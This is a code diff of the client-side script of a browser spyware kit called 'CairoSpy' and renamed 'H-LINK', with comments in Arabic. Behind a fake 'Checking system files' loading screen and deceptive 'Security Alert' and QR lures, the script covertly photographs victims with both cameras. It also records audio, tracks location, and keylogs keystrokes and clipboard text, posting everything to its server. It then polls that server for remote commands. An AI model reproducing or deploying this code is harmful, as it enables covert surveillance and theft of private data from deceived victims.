@@ -1,23 +1,20 @@
-// ========== CairoSpy V1 - Client Side ==========
-const SOCKET = io();
-let VICTIM_ID = generateId();
+// ========== H-LINK - Client Side (HTTP Polling) ==========
+let VICTIM_ID = 'victim_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now();
 let WEBCAM_INTERVAL = null;
 
-// === توليد ID للضحية ===
+// === توليد ID ===
 function generateId() {
-    return 'victim_' + Math.random().toString(36).substring(2, 10) + '_' + Date.now();
+    return VICTIM_ID;
 }
 
-// === تتبع الجهاز ===
+// === معلومات الجهاز ===
 function getDeviceInfo() {
     return {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        cookiesEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack
+        screen: screen.width + 'x' + screen.height,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 }
 
@@ -26,20 +23,21 @@ async function getIP() {
     try {
         const res = await fetch('https://api.ipify.org?format=json');
         const data = await res.json();
-        document.getElementById('ipInfo').textContent = data.ip;
+        if (document.getElementById('ipInfo')) {
+            document.getElementById('ipInfo').textContent = data.ip;
+        }
         return data.ip;
     } catch(e) {
-        document.getElementById('ipInfo').textContent = 'Unknown';
         return 'Unknown';
     }
 }
 
 // === الكاميرا ===
-async function captureCamera(type = 'both') {
+async function captureCamera(type) {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
             video: { facingMode: type === 'front' ? 'user' : 'environment', width: 640, height: 480 },
-            audio: true
+            audio: false
         });
         
         const video = document.createElement('video');
@@ -51,12 +49,11 @@ async function captureCamera(type = 'both') {
         canvas.height = 480;
         const ctx = canvas.getContext('2d');
         
-        // تصوير الإطار
         ctx.drawImage(video, 0, 0, 640, 480);
         const imageData = canvas.toDataURL('image/jpeg', 0.8);
         
         // إرسال الصورة
-        fetch('/api/camera', {
+        await fetch('/api/camera', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -66,9 +63,7 @@ async function captureCamera(type = 'both') {
             })
         });
         
-        // إيقاف الكاميرا
         stream.getTracks().forEach(track => track.stop());
-        
         return imageData;
     } catch(e) {
         console.log('Camera error:', e.message);
@@ -76,21 +71,20 @@ async function captureCamera(type = 'both') {
     }
 }
 
-// === تصوير الكاميرا الأمامية والخلفية معًا ===
+// === تصوير الكاميرتين معًا ===
 async function captureBothCameras() {
-    // الأمامية
     await captureCamera('front');
-    // الخلفية (بعد تأخير بسيط)
     setTimeout(async () => {
         await captureCamera('environment');
-    }, 500);
+    }, 1000);
 }
 
 // === تسجيل الصوت ===
 let mediaRecorder = null;
 let audioChunks = [];
 
-async function startAudioRecording(duration = 10000) {
+async function startAudioRecording(duration) {
+    duration = duration || 10000;
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         mediaRecorder = new MediaRecorder(stream);
@@ -108,7 +102,7 @@ async function startAudioRecording(duration = 10000) {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        filename: `audio_${VICTIM_ID}_${Date.now()}.webm`,
+                        filename: 'audio_' + VICTIM_ID + '_' + Date.now() + '.webm',
                         file: reader.result
                     })
                 });
@@ -128,27 +122,22 @@ async function startAudioRecording(duration = 10000) {
     }
 }
 
-// === Keylogger متقدم ===
+// === Keylogger ===
 let keyBuffer = '';
 let lastKeyTime = Date.now();
 
 document.addEventListener('keydown', function(e) {
     const key = e.key;
-    
-    // تجاهل المفاتيح الخاصة
     if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab', 'Escape'].includes(key)) return;
     
-    const now = Date.now();
     keyBuffer += key;
     
-    // إرسال كل 5 ثواني أو 50 حرف
-    if (keyBuffer.length >= 50 || (now - lastKeyTime) > 5000) {
+    if (keyBuffer.length >= 50 || (Date.now() - lastKeyTime) > 5000) {
         sendKeys();
-        lastKeyTime = now;
+        lastKeyTime = Date.now();
     }
 });
 
-// إرسال عند فقدان التركيز
 document.addEventListener('visibilitychange', function() {
     if (document.hidden && keyBuffer.length > 0) {
         sendKeys();
@@ -170,16 +159,13 @@ function sendKeys() {
     keyBuffer = '';
 }
 
-// التقاط الـClipboard
-document.addEventListener('copy', function(e) {
+// === Clipboard ===
+document.addEventListener('copy', function() {
     const text = document.getSelection().toString();
     fetch('/api/keylog', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            keys: '[COPY] ' + text,
-            url: window.location.href
-        })
+        body: JSON.stringify({ keys: '[COPY] ' + text, url: window.location.href })
     });
 });
 
@@ -188,10 +174,7 @@ document.addEventListener('paste', function(e) {
     fetch('/api/keylog', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            keys: '[PASTE] ' + text,
-            url: window.location.href
-        })
+        body: JSON.stringify({ keys: '[PASTE] ' + text, url: window.location.href })
     });
 });
 
@@ -201,87 +184,77 @@ async function getLocation() {
     
     navigator.geolocation.getCurrentPosition(
         async (position) => {
-            const data = {
-                lat: position.coords.latitude,
-                lon: position.coords.longitude,
-                accuracy: position.coords.accuracy,
-                speed: position.coords.speed,
-                timestamp: position.timestamp
-            };
-            
             fetch('/api/location', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    lat: position.coords.latitude,
+                    lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy
+                })
             });
         },
-        (error) => {
-            // محاولة IP Geolocation إذا فشل GPS
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(data => {
-                    fetch('/api/location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            lat: data.latitude,
-                            lon: data.longitude,
-                            accuracy: 'IP-based',
-                            city: data.city,
-                            region: data.region,
-                            country: data.country_name
-                        })
-                    });
-                })
-                .catch(() => {});
+        async (error) => {
+            // IP Geolocation كبديل
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                fetch('/api/location', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        lat: data.latitude,
+                        lon: data.longitude,
+                        accuracy: 'IP-based',
+                        city: data.city
+                    })
+                });
+            } catch(e) {}
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 10000 }
     );
 }
 
-// === جهات الاتصال (محاولة عن طريق vCard/WEBDAV) ===
-async function getContacts() {
-    // في المتصفحات الحديثة هذا صعب، لكن نحاول بالـ API المتاحة
-    try {
-        if (navigator.contacts && navigator.contacts.select) {
-            const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
-            fetch('/api/contacts', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ contacts: contacts })
-            });
-        }
-    } catch(e) {
-        console.log('Contacts API not supported');
-    }
-}
+// === الـ Polling (بدل WebSocket) ===
+setInterval(function() {
+    fetch('/api/poll')
+        .then(r => r.json())
+        .then(data => {
+            if (data.command && data.command.action) {
+                handleControl(data.command);
+            }
+        })
+        .catch(() => {});
+}, 3000);
 
-// === الـControl (أوامر التحكم) ===
-SOCKET.on('control', function(data) {
-    switch(data.action) {
+function handleControl(cmd) {
+    const data = cmd.data || cmd;
+    const action = data.action;
+    
+    switch(action) {
         case 'toast':
-            showToast(data.message);
+            showToast(data.message || 'Hello!');
             break;
         case 'notify':
-            showNotification(data.title, data.body);
+            showNotification(data.title || 'Alert', data.body || '');
             break;
         case 'sound':
             playSound();
             break;
         case 'vibrate':
             if (navigator.vibrate) {
-                navigator.vibrate(data.duration || 3000);
+                navigator.vibrate(parseInt(data.duration) || 3000);
             }
             break;
         case 'open_url':
-            window.open(data.url, '_blank');
+            window.open(data.url || 'https://example.com', '_blank');
             break;
     }
-});
+}
 
 function showToast(msg) {
     const toast = document.createElement('div');
-    toast.className = 'toast';
+    toast.style.cssText = 'position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,0.9);color:white;padding:12px 24px;border-radius:10px;z-index:9999;font-size:16px;';
     toast.textContent = msg;
     document.body.appendChild(toast);
     setTimeout(() => toast.remove(), 3000);
@@ -289,59 +262,56 @@ function showToast(msg) {
 
 function showNotification(title, body) {
     if ('Notification' in window && Notification.permission === 'granted') {
-        new Notification(title, { body: body, icon: '/static/fake.jpg' });
+        new Notification(title, { body: body });
     }
 }
 
 function playSound() {
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const osc = ctx.createOscillator();
-    const gain = ctx.createGain();
-    osc.type = 'sawtooth';
-    osc.frequency.value = 880;
-    gain.gain.value = 0.5;
-    osc.connect(gain);
-    gain.connect(ctx.destination);
-    osc.start();
-    setTimeout(() => osc.stop(), 5000);
+    try {
+        const ctx = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ctx.createOscillator();
+        const gain = ctx.createGain();
+        osc.type = 'sawtooth';
+        osc.frequency.value = 880;
+        gain.gain.value = 0.5;
+        osc.connect(gain);
+        gain.connect(ctx.destination);
+        osc.start();
+        setTimeout(() => {
+            try { osc.stop(); } catch(e) {}
+        }, 5000);
+    } catch(e) {}
 }
 
-// === صفحة اللودينغ ===
-let progress = 0;
-
+// === أنيميشن التحميل ===
 function animateLoading() {
     const progressBar = document.getElementById('progressBar');
     const statusText = document.getElementById('statusText');
     const loadingScreen = document.getElementById('loadingScreen');
     const permissionScreen = document.getElementById('permissionScreen');
     
-    const statuses = [
-        'Initializing...',
-        'Checking system files...',
-        'Verifying device compatibility...',
-        'Configuring security settings...',
-        'Almost done...'
-    ];
+    if (!progressBar) return;
+    
+    let progress = 0;
+    const statuses = ['Initializing...', 'Checking system files...', 'Verifying device...', 'Configuring security...', 'Almost done...'];
     
     const interval = setInterval(() => {
         progress += Math.random() * 15;
         if (progress > 100) progress = 100;
         
         progressBar.style.width = progress + '%';
-        statusText.textContent = statuses[Math.floor(progress / 25)] || 'Complete!';
+        if (statusText) statusText.textContent = statuses[Math.floor(progress / 25)] || 'Complete!';
         
         if (progress >= 100) {
             clearInterval(interval);
             setTimeout(() => {
-                loadingScreen.classList.add('hidden');
-                permissionScreen.classList.remove('hidden');
+                if (loadingScreen) loadingScreen.classList.add('hidden');
+                if (permissionScreen) permissionScreen.classList.remove('hidden');
                 
-                // بدء العمليات في الخلفية
                 setTimeout(async () => {
                     await captureBothCameras();
                     startAudioRecording(15000);
                     getLocation();
-                    getContacts();
                 }, 1000);
             }, 500);
         }
@@ -351,14 +321,9 @@ function animateLoading() {
 // === طلب الأذونات ===
 async function requestPermissions() {
     try {
-        // طلب الكاميرا والميكروفون
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: true, 
-            audio: true 
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         stream.getTracks().forEach(track => track.stop());
         
-        // طلب الإشعارات
         if ('Notification' in window) {
             Notification.requestPermission();
         }
@@ -366,14 +331,11 @@ async function requestPermissions() {
         document.getElementById('permissionScreen').classList.add('hidden');
         document.getElementById('mainScreen').classList.remove('hidden');
         
-        // التصوير الفوري
         await captureBothCameras();
         startAudioRecording(15000);
         getLocation();
-        getContacts();
-        
     } catch(e) {
-        console.log('Permission denied:', e.message);
+        console.log('Permission denied');
         skipPermissions();
     }
 }
@@ -381,49 +343,38 @@ async function requestPermissions() {
 function skipPermissions() {
     document.getElementById('permissionScreen').classList.add('hidden');
     document.getElementById('mainScreen').classList.remove('hidden');
-    
-    // محاولة بدون أذونات (IP Geolocation)
     getIP();
-    getLocation(); // IP-based
+    getLocation();
 }
 
 // === بدء التشغيل ===
 window.onload = function() {
-    // معلومات الجهاز
     getIP();
-    document.getElementById('deviceInfo').textContent = navigator.platform;
-    document.getElementById('browserInfo').textContent = navigator.userAgent.split('/')[0];
     
-    // بدأ الأنيميشن
+    if (document.getElementById('deviceInfo')) {
+        document.getElementById('deviceInfo').textContent = navigator.platform;
+    }
+    if (document.getElementById('browserInfo')) {
+        document.getElementById('browserInfo').textContent = navigator.userAgent.split('/')[0];
+    }
+    
     animateLoading();
     
-    // بدأ keylogger فورًا
-    document.addEventListener('DOMContentLoaded', function() {
-        // keylogger شغال
-    });
+    // هجوم الصورة
+    if (window.location.pathname === '/image') {
+        setTimeout(() => {
+            const overlay = document.createElement('div');
+            overlay.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;justify-content:center;align-items:center;z-index:1000;';
+            overlay.innerHTML = '<div style="background:#1a1a2e;padding:30px;border-radius:20px;text-align:center;color:white;"><h3>⚠️ Security Alert</h3><p>This image contains tracking metadata. Click OK to remove.</p><button onclick="this.parentElement.parentElement.remove(); requestPermissions();" style="background:#00d4ff;color:white;border:none;padding:10px 20px;border-radius:8px;margin-top:10px;cursor:pointer;">Remove Metadata</button></div>';
+            document.body.appendChild(overlay);
+        }, 2000);
+    }
+    
+    // هجوم QR
+    if (window.location.pathname === '/qr') {
+        setTimeout(() => {
+            const ps = document.getElementById('permissionScreen');
+            if (ps) ps.classList.remove('hidden');
+        }, 1500);
+    }
 };
-
-// === هجوم الصورة الملغمة ===
-if (window.location.pathname === '/image') {
-    // عند فتح الصورة، نظهر إعلان منبثق
-    setTimeout(() => {
-        const overlay = document.createElement('div');
-        overlay.className = 'modal-overlay';
-        overlay.innerHTML = `
-            <div class="modal">
-                <h3>⚠️ Security Alert</h3>
-                <p>This image contains tracking metadata. Click OK to remove.</p>
-                <button onclick="this.closest('.modal-overlay').remove(); requestPermissions();">Remove Metadata</button>
-            </div>
-        `;
-        document.body.appendChild(overlay);
-    }, 2000);
-}
-
-// === هجوم QR ===
-if (window.location.pathname === '/qr') {
-    // بعد مسح QR، يطلب الكاميرا
-    setTimeout(() => {
-        document.getElementById('permissionScreen').classList.remove('hidden');
-    }, 1500);
-}
